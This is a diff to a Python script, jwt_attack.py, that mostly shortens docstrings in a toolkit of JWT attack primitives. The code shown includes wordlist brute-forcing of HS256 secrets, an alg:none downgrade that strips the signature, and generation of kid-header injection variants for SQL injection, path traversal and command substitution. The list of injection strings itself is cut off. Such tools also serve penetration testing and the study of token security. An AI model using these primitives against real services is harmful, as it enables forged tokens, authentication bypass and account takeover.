@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-"""jwt_attack.py — JWT manipulation primitives: decode, tamper-resign,
-HS256 secret brute-force, alg:none downgrade, kid header injection payloads.
+"""jwt_attack.py — JWT primitives: decode, tamper-resign, HS256 wordlist
+brute, alg:none, and kid injection payloads. HMAC via stdlib.
 
 Usage
 -----
@@ -9,8 +9,6 @@ Usage
     python jwt_attack.py brute  <token> --wordlist <file>
     python jwt_attack.py none   <token>
     python jwt_attack.py kid    <token> --payload <string>
-
-Implements HS256 with stdlib ``hmac`` / ``hashlib`` — no PyJWT dependency.
 """
 from __future__ import annotations
 
@@ -33,8 +31,7 @@ def b64url_decode(s: str) -> bytes:
 
 
 def decode(token: str) -> tuple[dict, dict, bytes]:
-    """Return ``(header, payload, signature_bytes)``. Raises ``ValueError`` if
-    the token isn't a well-formed three-segment JWT."""
+    """Return ``(header, payload, signature_bytes)``."""
     parts = token.split(".")
     if len(parts) != 3:
         raise ValueError(f"expected 3 segments, got {len(parts)}")
@@ -51,9 +48,8 @@ def _signing_input(header: dict, payload: dict) -> str:
 
 
 def encode(header: dict, payload: dict, secret: bytes | None = None) -> str:
-    """Encode a JWT. If ``secret`` is given and header.alg is HS256, signs
-    with HMAC-SHA256. If header.alg is 'none' (any case), emits an empty
-    signature segment regardless of ``secret``."""
+    """Encode a JWT. Signs HS256/HS384/HS512 if ``secret`` is given. If
+    header alg is ``none`` (any case), emits an empty signature segment."""
     si = _signing_input(header, payload)
     alg = str(header.get("alg", "")).lower()
     if alg == "none":
@@ -72,8 +68,7 @@ def encode(header: dict, payload: dict, secret: bytes | None = None) -> str:
 
 
 def brute_hs256(token: str, wordlist: Iterable[str]) -> str | None:
-    """Try each candidate as the HS256 secret. Return the first match, or
-    None if exhausted."""
+    """Try each candidate as the HS256 secret. Return the first match."""
     parts = token.split(".")
     if len(parts) != 3:
         raise ValueError("malformed token")
@@ -90,8 +85,7 @@ def brute_hs256(token: str, wordlist: Iterable[str]) -> str | None:
 
 
 def alg_none(token: str) -> str:
-    """Return a variant of ``token`` with ``alg`` set to ``none`` and an
-    empty signature segment. Claims are preserved."""
+    """Variant of ``token`` with alg=none and an empty signature."""
     header, payload, _ = decode(token)
     header["alg"] = "none"
     si = _signing_input(header, payload)
@@ -99,9 +93,8 @@ def alg_none(token: str) -> str:
 
 
 def kid_payloads(token: str, injection: str) -> list[str]:
-    """Return variants of ``token`` whose header ``kid`` is set to common
-    injection patterns built around ``injection`` (SQLi, path traversal,
-    command substitution)."""
+    """Variants of ``token`` with the header ``kid`` field set to common
+    SQLi / path-traversal / command-substitution shapes around ``injection``."""
     header, payload, sig = decode(token)
     variants: list[str] = []
     candidates = [
